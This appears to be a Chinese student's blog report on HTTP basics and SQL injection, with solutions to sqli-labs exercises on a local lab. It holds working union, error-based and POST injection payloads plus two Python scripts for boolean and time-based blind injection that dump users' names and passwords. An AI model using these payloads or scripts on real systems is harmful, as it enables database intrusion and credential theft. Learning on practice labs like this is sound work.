@@ -1,0 +1,361 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Web小组报告（二） | Xorex</title><meta name="keywords" content="报告"><meta name="author" content="Xorex"><meta name="copyright" content="Xorex"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web小组报告（二）">
+<meta property="og:url" content="https://xorex.space/2020/09/29/88da8982a4e7/index.html">
+<meta property="og:site_name" content="Xorex">
+<meta property="og:description" content="SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xorex.space/waifus/049.jpg">
+<meta property="article:published_time" content="2020-09-29T13:20:13.000Z">
+<meta property="article:modified_time" content="2021-02-20T13:56:46.989Z">
+<meta property="article:author" content="Xorex">
+<meta property="article:tag" content="报告">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xorex.space/waifus/049.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://xorex.space/2020/09/29/88da8982a4e7/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-02-20 21:56'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    })(window)</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Xorex" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/Megumi.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">119</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">95</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/artitalk/"><i class="fa-fw fas fa-comment-dots"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/image/PostTop.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Xorex</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/artitalk/"><i class="fa-fw fas fa-comment-dots"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Web小组报告（二）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2020-09-29T13:20:13.000Z" title="undefined 2020-09-29 21:20">2020-09-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="URL-HTTP请求方法相关："><a href="#URL-HTTP请求方法相关：" class="headerlink" title="URL/HTTP请求方法相关："></a>URL/HTTP请求方法相关：</h2><ol>
+<li><strong>请列举出4种常见URL协议：</strong></li>
+</ol>
+<ul>
+<li>HTTP/HTTPS协议，FTP协议，File协议，Mailto协议等。</li>
+</ul>
+<ol start="2">
+<li><strong>请列举出6种常见HTTP请求方法：</strong></li>
+</ol>
+<ul>
+<li><p><strong>Get，Post，Head，Put，Delete，Options，TRACE，Connect</strong>，共七种请求方法。</p>
+</li>
+<li><p><strong>GET</strong>：用来请求访问已被URI识别的资源。</p>
+</li>
+<li><p><strong>POST</strong>：用来传输实体的主体。</p>
+</li>
+<li><p><strong>PUT</strong>：用来传输文件。</p>
+</li>
+<li><p><strong>HEAD</strong>：用来获取报文首部。</p>
+</li>
+<li><p><strong>DELETE</strong>：用来删除文件，和PUT相反。</p>
+</li>
+<li><p><strong>OPTIONS</strong>：询问针对请求URI指定的资源<br>支持的方法。</p>
+</li>
+<li><p><strong>TRACE</strong>： 让服务器返回之前的请求通<br>信。</p>
+</li>
+<li><p><strong>CONNECT</strong>：要求使用隧道协议链接代理。</p>
+</li>
+</ul>
+<ol start="3">
+<li><strong>向 <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a> 发送GET请求,键值对为<code>name:xx</code>及<code>id:0</code>的URL是?</strong></li>
+</ol>
+<ul>
+<li>URL：<a target="_blank" rel="noopener" href="http://example.com/?name=xx&amp;id=0">http://example.com/?name=xx&amp;id=0</a></li>
+</ul>
+<ol start="4">
+<li><strong>GET请求和POST请求的主要用途是?</strong></li>
+</ol>
+<ul>
+<li>向目标地址发送获取资源的访问请求，GET可以传输简短的信息，POST可以传输较多信息。</li>
+</ul>
+<ol start="5">
+<li><strong>假设存在以下场景:某人通过网上银行进行转账操作,你认为哪种请求方法更好?(GET/POST)</strong></li>
+</ol>
+<ul>
+<li>当然是POST请求方法好，转账的时候输入信息不会显示在URL中，而是存在于Body中。</li>
+</ul>
+<h2 id="SQL注入相关："><a href="#SQL注入相关：" class="headerlink" title="SQL注入相关："></a>SQL注入相关：</h2><ol>
+<li><strong>尝试描述:什么是sql注入?</strong></li>
+</ol>
+<ul>
+<li>由于很多后台在进行对用户输入数据进行查询过程中，往往利用用户输入的数据来构造SQL语句，我们就可以利用输入的数据中加入自己的SQL语句，将其注入后台中并执行。以此达成获取数据库中的数据的目的。</li>
+</ul>
+<ol start="2">
+<li><strong>尝试概括:sql注入的形成原因?</strong></li>
+</ol>
+<ul>
+<li>开发人员使用动态字符串构造SQL语句来创建所需的命令，如果不对这些从用户获得的数据加以严格的过滤，构造的SQL语句可能存在来自于用户的恶意命令，对数据库安全造成严重威胁。</li>
+</ul>
+<ol start="3">
+<li><strong>尽可能列举出所有的sql注入类型</strong></li>
+</ol>
+<ul>
+<li><p>GET注入，Cookie注入，POST注入，HTTP头部注入</p>
+</li>
+<li><p>布尔注入，时间注入，报错注入，联合查询注入，堆查询注入，宽字节注入。</p>
+</li>
+</ul>
+<ol start="4">
+<li><strong>使用sqli-labs进行学习(请使用手工进行注入,不能使用相关工具,要求截图注入提交的URL及最后爆出flag标志(在当前数据库下的另外一个表中)):</strong></li>
+</ol>
+<ul>
+<li><strong>Less-1</strong></li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users%20--%20</span><br></pre></td></tr></table></figure>
+<p><img src="https://xorex.space/image/128.png" alt="image.png"></p>
+<ul>
+<li><strong>Less-2</strong></li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20users%20--%20</span><br></pre></td></tr></table></figure>
+<p><img src="https://xorex.space/image/129.png" alt="image.png"></p>
+<ul>
+<li><strong>Less-5</strong></li>
+</ul>
+<p>报错注入，我这里使用的构造group_concat重复写入错误。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-5/?id=-1%27%20union%20select%201,count(%2a),concat((select%20concat(username,%27%20%27,password)%20from%20users%20limit%200,1),floor(rand(0)%2a2))%20as%20a%20from%20information_schema.tables%20group%20by%20a%20--%20</span><br></pre></td></tr></table></figure>
+<p><img src="https://xorex.space/image/130.png" alt="image.png"></p>
+<p>剩下的数据只要修改LIMIT显示范围就可以得到了。</p>
+<ul>
+<li><strong>Less-8</strong></li>
+</ul>
+<p>这道题原本想要用burpsuite来解决的，但是浏览器代理出了点问题，burpsuite抓不到包，于是就只能现学Python花了很多时间，写了脚本解决问题，直接爆数据，成对输出：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">Over=<span class="string">&quot; -- &quot;</span></span><br><span class="line">Right=<span class="string">b&quot;You are in&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://localhost/sqli-labs/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line">Verifystring=<span class="string">&quot; and left(%s,%d)=&#x27;%s&#x27;&quot;</span></span><br><span class="line">VerifyLength=<span class="string">&quot; and length(concat(%s,&#x27;1&#x27;))=%d&quot;</span></span><br><span class="line">UserName=<span class="string">&quot;(select username from users limit %d,1)&quot;</span></span><br><span class="line">Password=<span class="string">&quot;(select password from users limit %d,1)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_Number</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        LastUrl=<span class="string">&quot; and concat((select count(*) from users))=%d -- &quot;</span>%i</span><br><span class="line">        FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">        Respond=urllib.request.urlopen(FinalUrl)</span><br><span class="line">        <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.read():</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLength_UserName</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        LastUrl=VerifyLength%(UserName%<span class="built_in">id</span>,i+<span class="number">1</span>)+Over</span><br><span class="line">        FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">        Respond=urllib.request.urlopen(FinalUrl)</span><br><span class="line">        <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.read():</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLength_Password</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        LastUrl=VerifyLength%(Password%<span class="built_in">id</span>,i+<span class="number">1</span>)+Over</span><br><span class="line">        FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">        Respond=urllib.request.urlopen(FinalUrl)</span><br><span class="line">        <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.read():</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_UserName</span>(<span class="params"><span class="built_in">id</span>,<span class="built_in">len</span></span>):</span></span><br><span class="line">    Try=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>):</span><br><span class="line">            LastUrl=Verifystring%(UserName%<span class="built_in">id</span>,i+<span class="number">1</span>,(Try+<span class="built_in">chr</span>(j+<span class="number">48</span>)))+Over</span><br><span class="line">            FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">            Respond=urllib.request.urlopen(FinalUrl)</span><br><span class="line">            <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.read():</span><br><span class="line">                Try=Try+<span class="built_in">chr</span>(j+<span class="number">48</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> Try</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_Password</span>(<span class="params"><span class="built_in">id</span>,<span class="built_in">len</span></span>):</span></span><br><span class="line">    Try=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>):</span><br><span class="line">            LastUrl=Verifystring%(Password%<span class="built_in">id</span>,i+<span class="number">1</span>,(Try+<span class="built_in">chr</span>(j+<span class="number">33</span>)))+Over</span><br><span class="line">            FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">            Respond=urllib.request.urlopen(FinalUrl)</span><br><span class="line">            <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.read():</span><br><span class="line">                Try=Try+<span class="built_in">chr</span>(j+<span class="number">33</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> Try  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Get_Number()):</span><br><span class="line">    IDL=GetLength_UserName(i)</span><br><span class="line">    PWL=GetLength_Password(i)</span><br><span class="line">    IDS=Get_UserName(i,IDL)</span><br><span class="line">    PWS=Get_Password(i,PWL)</span><br><span class="line">    print(IDS,<span class="string">&#x27;:&#x27;</span>,PWS)    </span><br></pre></td></tr></table></figure>
+<p>下面是本地输出的数据：<br><img src="https://xorex.space/image/131.png" alt="image.png"></p>
+<ul>
+<li><strong>Less-9</strong></li>
+</ul>
+<p>时间盲注，把上一题的脚本改一改就可以用了，从判断”You are in”更改为判断返回的时间。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">Over=<span class="string">&quot; -- &quot;</span></span><br><span class="line">url=<span class="string">&quot;http://localhost/sqli-labs/Less-9/?id=1&#x27;&quot;</span></span><br><span class="line">Verifystring=<span class="string">&quot; and if(left(%s,%d)=&#x27;%s&#x27;,sleep(0.1),1)&quot;</span></span><br><span class="line">VerifyLength=<span class="string">&quot; and if(length(concat(%s,&#x27;1&#x27;))=%d,sleep(0.1),1)&quot;</span></span><br><span class="line">UserName=<span class="string">&quot;(select username from users limit %d,1)&quot;</span></span><br><span class="line">Password=<span class="string">&quot;(select password from users limit %d,1)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_Number</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        LastUrl=<span class="string">&quot; and if(concat((select count(*) from users))=%d,sleep(0.1),1) -- &quot;</span>%i</span><br><span class="line">        FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">        Start=time.time()</span><br><span class="line">        urllib.request.urlopen(FinalUrl)</span><br><span class="line">        End=time.time()</span><br><span class="line">        <span class="keyword">if</span> (End-Start)&gt;<span class="number">0.1</span> <span class="keyword">and</span> (End-Start)&lt;<span class="number">0.2</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLength_UserName</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        LastUrl=VerifyLength%(UserName%<span class="built_in">id</span>,i+<span class="number">1</span>)+Over</span><br><span class="line">        FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">        Start=time.time()</span><br><span class="line">        urllib.request.urlopen(FinalUrl)</span><br><span class="line">        End=time.time()</span><br><span class="line">        <span class="keyword">if</span> (End-Start)&gt;<span class="number">0.1</span> <span class="keyword">and</span> (End-Start)&lt;<span class="number">0.2</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLength_Password</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        LastUrl=VerifyLength%(Password%<span class="built_in">id</span>,i+<span class="number">1</span>)+Over</span><br><span class="line">        FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">        Start=time.time()</span><br><span class="line">        urllib.request.urlopen(FinalUrl)</span><br><span class="line">        End=time.time()</span><br><span class="line">        <span class="keyword">if</span> (End-Start)&gt;<span class="number">0.1</span> <span class="keyword">and</span> (End-Start)&lt;<span class="number">0.2</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_UserName</span>(<span class="params"><span class="built_in">id</span>,<span class="built_in">len</span></span>):</span></span><br><span class="line">    Try=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>):</span><br><span class="line">            LastUrl=Verifystring%(UserName%<span class="built_in">id</span>,i+<span class="number">1</span>,(Try+<span class="built_in">chr</span>(j+<span class="number">48</span>)))+Over</span><br><span class="line">            FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">            Start=time.time()</span><br><span class="line">            urllib.request.urlopen(FinalUrl)</span><br><span class="line">            End=time.time()</span><br><span class="line">            <span class="keyword">if</span> (End-Start)&gt;<span class="number">0.1</span> <span class="keyword">and</span> (End-Start)&lt;<span class="number">0.2</span>:</span><br><span class="line">                Try=Try+<span class="built_in">chr</span>(j+<span class="number">48</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> Try</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_Password</span>(<span class="params"><span class="built_in">id</span>,<span class="built_in">len</span></span>):</span></span><br><span class="line">    Try=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>):</span><br><span class="line">            LastUrl=Verifystring%(Password%<span class="built_in">id</span>,i+<span class="number">1</span>,(Try+<span class="built_in">chr</span>(j+<span class="number">33</span>)))+Over</span><br><span class="line">            FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">            Start=time.time()</span><br><span class="line">            urllib.request.urlopen(FinalUrl)</span><br><span class="line">            End=time.time()</span><br><span class="line">            <span class="keyword">if</span> (End-Start)&gt;<span class="number">0.1</span> <span class="keyword">and</span> (End-Start)&lt;<span class="number">0.2</span>:</span><br><span class="line">                Try=Try+<span class="built_in">chr</span>(j+<span class="number">33</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> Try  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Get_Number()):</span><br><span class="line">    IDL=GetLength_UserName(i)</span><br><span class="line">    PWL=GetLength_Password(i)</span><br><span class="line">    IDS=Get_UserName(i,IDL)</span><br><span class="line">    PWS=Get_Password(i,PWL)</span><br><span class="line">    print(IDS,<span class="string">&#x27;:&#x27;</span>,PWS)</span><br></pre></td></tr></table></figure>
+<p><img src="https://xorex.space/image/132.png" alt="image.png"></p>
+<ul>
+<li><strong>Less-11</strong></li>
+</ul>
+<p>简单的Post注入，方法和前几道题目差不多。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1&#x27; union select (select group_concat(username) from users),(select group_concat(username) from users) -- &amp;passwd=Dumb&amp;sumbit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="https://xorex.space/image/134.png" alt="image.png"></p>
+<ul>
+<li><strong>Less-14</strong></li>
+</ul>
+<p>报错盲注，只需要修改Limit后面的参数就可以获得所有数据了。</p>
